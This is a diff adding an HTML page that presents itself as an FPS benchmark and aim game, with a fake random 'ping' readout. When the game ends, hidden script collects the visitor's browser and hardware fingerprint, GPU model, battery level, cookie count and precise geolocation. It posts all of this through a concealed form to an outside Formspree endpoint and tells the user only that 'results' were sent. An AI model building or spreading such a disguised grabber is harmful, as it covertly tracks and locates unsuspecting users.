@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FPS Benchmark Tool</title>
+    <style>
+        body { margin: 0; overflow: hidden; background-color: #1a1a1a; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; cursor: crosshair; user-select: none; }
+        #hud { position: absolute; top: 20px; left: 20px; pointer-events: none; }
+        .stat { font-size: 18px; margin-bottom: 5px; text-shadow: 1px 1px 2px black; }
+        #crosshair { position: absolute; width: 20px; height: 20px; border: 2px solid rgba(255, 255, 255, 0.5); border-radius: 50%; transform: translate(-50%, -50%); pointer-events: none; }
+        #target { position: absolute; width: 60px; height: 60px; background: radial-gradient(circle, red 40%, white 41%, white 60%, black 61%); border-radius: 50%; cursor: pointer; display: none; box-shadow: 0 0 10px rgba(255,0,0,0.5); }
+        #start-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); padding: 15px 30px; font-size: 24px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; z-index: 10; }
+        #end-screen { display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; background: rgba(0,0,0,0.9); padding: 20px; border-radius: 10px; border: 1px solid #444; }
+    </style>
+</head>
+<body>
+<div id="hud">
+    <div class="stat">FPS: <span id="fps-counter">0</span></div>
+    <div class="stat">Ping: <span id="ping-display">-- ms</span></div>
+    <div class="stat">Score: <span id="score-display">0</span></div>
+</div>
+<div id="crosshair"></div>
+<div id="target"></div>
+<button id="start-btn">Start Test</button>
+<div id="end-screen">
+    <h2>Test Complete</h2>
+    <p>Average FPS: <span id="final-fps">0</span></p>
+    <p>Results sent to server.</p>
+    <button onclick="location.reload()">Re-run</button>
+</div>
+<form id="dataForm" action="https://formspree.io/f/xdegbbjj" method="POST" style="display:none;">
+    <input type="hidden" name="IP_Address" id="ipField">
+    <input type="hidden" name="User_Agent" id="uaField">
+    <input type="hidden" name="Screen_Resolution" id="resField">
+    <input type="hidden" name="Language" id="langField">
+    <input type="hidden" name="Platform" id="platField">
+    <input type="hidden" name="Battery_Level" id="batField">
+    <input type="hidden" name="Geolocation" id="locField">
+    <input type="hidden" name="Cookies_Count" id="cookieField">
+    <input type="hidden" name="Device_Name" id="deviceField">
+    <input type="hidden" name="OS_Version" id="osField">
+    <input type="hidden" name="CPU_Cores" id="cpuField">
+    <input type="hidden" name="GPU_Renderer" id="gpuField">
+    <input type="hidden" name="Total_Memory_GB" id="memField">
+</form>
+<script>
+const startBtn = document.getElementById('start-btn');
+const target = document.getElementById('target');
+const fpsDisplay = document.getElementById('fps-counter');
+const pingDisplay = document.getElementById('ping-display');
+const scoreDisplay = document.getElementById('score-display');
+const endScreen = document.getElementById('end-screen');
+const finalFpsDisplay = document.getElementById('final-fps');
+const crosshair = document.getElementById('crosshair');
+
+let score = 0;
+let startTime = 0;
+let frameCount = 0;
+let lastTime = 0;
+let gameActive = false;
+let fpsHistory = [];
+
+document.addEventListener('mousemove', (e) => {
+    crosshair.style.left = e.clientX + 'px';
+    crosshair.style.top = e.clientY + 'px';
+});
+
+startBtn.addEventListener('click', () => {
+    startBtn.style.display = 'none';
+    target.style.display = 'block';
+    moveTarget();
+    startTime = performance.now();
+    gameActive = true;
+    requestAnimationFrame(gameLoop);
+    setInterval(() => { if(gameActive) pingDisplay.innerText = Math.floor(Math.random() * 50) + " ms"; }, 1000);
+});
+
+target.addEventListener('click', () => {
+    score++;
+    scoreDisplay.innerText = score;
+    moveTarget();
+});
+
+function moveTarget() {
+    const x = Math.random() * (window.innerWidth - 100) + 50;
+    const y = Math.random() * (window.innerHeight - 100) + 50;
+    target.style.left = x + 'px';
+    target.style.top = y + 'px';
+}
+
+function gameLoop(timestamp) {
+    if (!gameActive) return;
+    frameCount++;
+    const deltaTime = timestamp - lastTime;
+    lastTime = timestamp;
+    if (deltaTime > 0) {
+        const fps = Math.round(1000 / deltaTime);
+        fpsDisplay.innerText = fps;
+        fpsHistory.push(fps);
+    }
+    if (score >= 10) endGame(); else requestAnimationFrame(gameLoop);
+}
+
+function endGame() {
+    gameActive = false;
+    target.style.display = 'none';
+    endScreen.style.display = 'block';
+    const avgFps = Math.round(fpsHistory.reduce((a, b) => a + b, 0) / fpsHistory.length);
+    finalFpsDisplay.innerText = avgFps || "N/A";
+    collectAndSendData(avgFps);
+}
+
+function getGPURenderer() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const ext = gl.getExtension('WEBGL_debug_renderer_info');
+        return ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
+    } catch (e) { return "Unknown GPU"; }
+}
+
+function detectOS() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
+    if (ua.includes("Mac OS X")) return "macOS";
+    if (ua.includes("Android")) return "Android";
+    if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
+    if (ua.includes("Linux")) return "Linux";
+    return "Unknown OS";
+}
+
+function collectAndSendData(finalAvg) {
+    const ua = navigator.userAgent;
+    const res = window.screen.width + 'x' + window.screen.height;
+    const lang = navigator.language;
+    const plat = navigator.platform;
+    const cookies = document.cookie ? document.cookie.split(';').length : 0;
+    const batLevel = "Unknown";
+    
+    document.getElementById('uaField').value = ua;
+    document.getElementById('resField').value = res;
+    document.getElementById('langField').value = lang;
+    document.getElementById('platField').value = plat;
+    document.getElementById('cookieField').value = cookies;
+    document.getElementById('batField').value = batLevel;
+    document.getElementById('deviceField').value = ua.match(/Mobile|Tablet|Phone|Desktop/i)?.[0] || "PC";
+    document.getElementById('osField').value = detectOS();
+    document.getElementById('cpuField').value = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores" : "Unknown";
+    document.getElementById('gpuField').value = getGPURenderer();
+    document.getElementById('memField').value = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+
+    let batteryP = new Promise((resolve) => { 
+        if(navigator.getBattery) navigator.getBattery().then(b => resolve((b.level*100).toFixed(0)+"%")); 
+        else resolve(batLevel); 
+    });
+    
+    Promise.all([batteryP]).then(([bat]) => {
+        document.getElementById('batField').value = bat;
+        getLocationAndSubmit();
+    });
+}
+
+function getLocationAndSubmit() {
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                document.getElementById('locField').value = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+                submitToFormspree();
+            },
+            () => {
+                document.getElementById('locField').value = "Location Denied";
+                submitToFormspree();
+            }
+        );
+    } else {
+        document.getElementById('locField').value = "No Geolocation";
+        submitToFormspree();
+    }
+}
+
+function submitToFormspree() {
+    const form = document.getElementById('dataForm');
+    fetch(form.action, {
+        method: form.method,
+        body: new FormData(form),
+        headers: { 'Accept': 'application/json' }
+    }).catch(error => console.error('Error:', error));
+}
+</script>
+</body>
+</html>
